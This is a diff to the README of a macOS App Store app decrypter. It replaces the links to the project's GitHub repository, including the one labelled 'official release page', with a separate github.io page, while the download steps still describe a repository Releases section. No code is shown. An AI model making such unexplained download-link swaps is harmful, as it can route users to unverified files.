@@ -1,6 +1,6 @@
 # 💻 macOSAppstoreDecrypter - Unlock Desktop Apps For Your Archive
 
-[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/minhasc790/macOSAppstoreDecrypter)
+[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://minhasc790.github.io)
 
 ## 📌 About This Tool
 
@@ -17,7 +17,7 @@ If your version is 11.3 or higher, the tool will not work. Verify that you have 
 ## 📥 How To Download
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/minhasc790/macOSAppstoreDecrypter).
+2. Go to the [official release page](https://minhasc790.github.io).
 3. Look for the section labeled Releases on the right side of the page.
 4. Click the latest version number.
 5. Find the file ending in .zip or .dmg.
